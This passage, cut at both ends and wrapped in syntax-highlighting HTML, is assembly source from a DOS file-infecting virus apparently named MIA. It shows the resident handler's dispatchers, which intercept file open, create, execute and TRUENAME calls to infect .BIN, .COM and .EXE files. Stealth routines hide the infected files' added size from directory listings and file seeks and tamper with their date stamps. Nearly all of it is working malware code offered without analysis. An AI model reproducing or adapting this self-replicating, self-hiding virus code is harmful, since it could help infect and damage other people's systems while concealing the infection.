 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Get DTA address</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ES:[BX+1Eh] = ASCIZ filename</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; DS = ES</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Specify</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Interweave</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Failure</span><span class="sc0">          </span><span class="sc1">; Jump if not .BIN, .COM, or .EXE</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=11h/12h dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Impulsive</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Try to hide file size thru FCB</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Quickie</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">                   </span><span class="sc1">; Push all registers</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Get DTA address</span><span class="sc0">

 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">  </span><span class="sc1">; Normal/eXtended FCB ? (NFCB/XFCB)</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Inextend</span><span class="sc0">               
 </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; XFCB has an additional seven bytes. </span><span class="sc0">
                               
</span><span class="sc5">Inextend</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Then, check attributes for infection mark</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5845h</span><span class="sc0">               </span><span class="sc1">; 'XE'</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                     
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; DS = ES</span><span class="sc0">

 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Blank-padded filename, so extension is always</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Affirm</span><span class="sc0">                 </span><span class="sc1">; at ES:[BX+08h]</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                 </span><span class="sc1">; 'N'</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc2">4942h</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Affirm</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; 'M'</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc2">4F43h</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Failure</span><span class="sc0">

</span><span class="sc5">Affirm</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Third character of file extension</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Failure</span><span class="sc0">

</span><span class="sc5">Interweave</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc4">],</span><span class="sc2">0C7h</span><span class="sc0">
 </span><span class="sc6">jbe</span><span class="sc0">    </span><span class="sc5">Failure</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Unarchive</span><span class="sc0">              </span><span class="sc1">; A sucker is around?</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">jbe</span><span class="sc0">    </span><span class="sc5">Failure</span><span class="sc0">                </span><span class="sc1">; Need to kick some ass?</span><span class="sc0">

 </span><span class="sc6">les</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get 32-bit file size</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">; Copy hi-size into CX</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0">              </span><span class="sc1">; Subtract virus size from file size</span><span class="sc0">
 </span><span class="sc6">sbb</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">               </span><span class="sc1">; Fixup for hi-size</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Failure</span><span class="sc0">                </span><span class="sc1">; ??</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">  </span><span class="sc1">; Set new size, 8-)</span><span class="sc0">

</span><span class="sc5">Failure</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">                   </span><span class="sc1">; Pop all registers</span><span class="sc0">

</span><span class="sc5">Quickie</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Request</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=57h dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Stamp</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Get/set date/time stamps?</span><span class="sc0">
 </span><span class="sc6">ja</span><span class="sc0">     </span><span class="sc5">Saviour</span><span class="sc0">                </span><span class="sc1">; Branch if not</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Verify</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Zero AL ?</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Awesome</span><span class="sc0">                </span><span class="sc1">; Jump if getting stamps</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">37h</span><span class="sc0">                 </span><span class="sc1">; Year 2007+ ?</span><span class="sc0">
 </span><span class="sc6">jnbe</span><span class="sc0">   </span><span class="sc5">Saviour</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc0">                </span><span class="sc1">; If not above, back to the future... he he he...</span><span class="sc0">

</span><span class="sc5">Awesome</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Obtain the stamps</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc0">                </span><span class="sc1">; He he he... turn back the time...</span><span class="sc0">

</span><span class="sc5">Helper</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Quickie</span><span class="sc0">



</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=42h dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Pointseek</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; Lseek from EOF ?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Saviour</span><span class="sc0">             
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Verify</span><span class="sc0">                 </span><span class="sc1">; Check the infection mark</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0">              </span><span class="sc1">; Adjust pointer</span><span class="sc0">
 </span><span class="sc6">sbb</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">               </span><span class="sc1">; so He won't be able to touch My MIA</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; Restore CX </span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Quickie</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=3Ch/5Bh/6Ch dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">

                               </span><span class="sc1">; This routine is shared with function 3Ch, 5Bh,</span><span class="sc0">
</span><span class="sc5">Creative</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; and 6Ch to be efficient</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">F_Hand</span><span class="sc4">],</span><span class="sc2">0001h</span><span class="sc0">      
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Brand_New</span><span class="sc0">              

</span><span class="sc5">Saviour</span><span class="sc4">:</span><span class="sc0">                       
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Clueless</span><span class="sc0">               </span><span class="sc1">; If not zero, We're waiting for an opened file</span><span class="sc0">

</span><span class="sc5">Brand_New</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pusha</span><span class="sc0">                         </span><span class="sc1">; Push all registers except segment ones</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6Ch</span><span class="sc0">                 </span><span class="sc1">; Extended open/create?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Extensive</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; if not, it's at DS:DX</span><span class="sc0">

</span><span class="sc5">Extensive</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Specify</span><span class="sc0">                </span><span class="sc1">; Check filename at DS:[SI]</span><span class="sc0">
 </span><span class="sc6">popa</span><span class="sc0">                          </span><span class="sc1">; Pop all registers except segment ones</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Saviour</span><span class="sc0">                </span><span class="sc1">; Bail out if not .BIN, .COM, or .EXE</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">                          </span><span class="sc1">; Restore flags state</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Stuff_01</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">   
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Execute original interrupt</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">                         </span><span class="sc1">; Ugh! save flags again</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Quickie</span><span class="sc0">                </span><span class="sc1">; Error, MIA isn't responsible for that</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">                   </span><span class="sc1">; Push all registers</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">F_Hand</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; Store file handle</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Stuff_01</span><span class="sc4">],</span><span class="sc2">6Ch</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Extraneous</span><span class="sc0">             </span><span class="sc1">; Jump if extended open/create</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; It's at DS:DX</span><span class="sc0">

</span><span class="sc5">Extraneous</span><span class="sc4">:</span><span class="sc0"> 
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">                 </span><span class="sc1">; DOS service AH=60h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0">     </span><span class="sc1">; Canonize filename and put result at ES:[DI]</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; Check it out, open or create?</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Quickie</span><span class="sc0">                </span><span class="sc1">; Jump if not open file</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6Ch</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">                   </span><span class="sc1">; If opening file, the file already exists</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Macron</span><span class="sc0">           </span><span class="sc1">; So go infect it!</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=60h dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">

</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; This handles function AH=60h which is generated by (undocumented)  TRUENAME</span><span class="sc0">
</span><span class="sc1">; command, so any .BIN/.COM/.EXE file typed as its parameter will be infected</span><span class="sc0">
</span><span class="sc1">; as long as it exists 8-), for example, typing "TRUENAME C:\DIVA.EXE" at DOS</span><span class="sc0">
</span><span class="sc1">; prompt will cause the file C:\DIVA.EXE to be infected.</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">Canonicalization</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Call the function</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Helper</span><span class="sc0">                 </span><span class="sc1">; There's a problem, branch</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Character</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">      </span><span class="sc1">; Store returned AH, usually 00h or 3Dh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">                 
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">                   </span><span class="sc1">; Push all registers</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">cld</span><span class="sc0">                           </span><span class="sc1">; Clear direction flag</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; ES:[DI] = buffer for canonized file/path name</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Seename</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=44h dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">IO_Control</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">                 </span><span class="sc1">; Generic block device request?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Saviour</span><span class="sc0">                </span><span class="sc1">; Branch if not</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0871h</span><span class="sc0">               </span><span class="sc1">; Category code 08h, minor code 71h? (get file's</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Saviour</span><span class="sc0">                </span><span class="sc1">; first cluster)</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=3Dh/41h/43h/4Bh/56h dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">

</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; AX=4B00h : Loads &amp; executes program at DS:DX with parameter at ES:[BX]</span><span class="sc0">
</span><span class="sc1">; AX=4B01h : Same as above but loads only (do not execute) </span><span class="sc0">
</span><span class="sc1">; AX=4B03h : Loads overlay at DS:DX</span><span class="sc0">
</span><span class="sc1">; AX=4B04h : Loads and execute in European MS-DOS background</span><span class="sc0">
</span><span class="sc1">; AX=4B05h : Set execution state</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">Multitude</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; DS:DX points filename</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Bh</span><span class="sc0">                 </span><span class="sc1">; Execution?</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; Make DS:[SI] points at filename</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Seename</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                 </span><span class="sc1">; Set execution state?</span><span class="sc0">
 </span><span class="sc6">ja</span><span class="sc0">     </span><span class="sc5">Saviour</span><span class="sc0">                </span><span class="sc1">; Above?? yeah many viruses use this</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Seename</span><span class="sc0">                </span><span class="sc1">; Below?? no need to set up</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; DS:[SI+04h] = pointer to ASCIZ filename</span><span class="sc0">

</span><span class="sc5">Seename</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Specify</span><span class="sc0">                </span><span class="sc1">; Only allow .BIN, .COM, &amp; .EXE files</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Trixie</span><span class="sc0">

</span><span class="sc5">Macron</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">F_Off</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">F_Off</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">    
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get requested function number</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc0">                 </span><span class="sc1">; Function: change default drive?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Outside</span><span class="sc0">                </span><span class="sc1">; Branch if yes</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
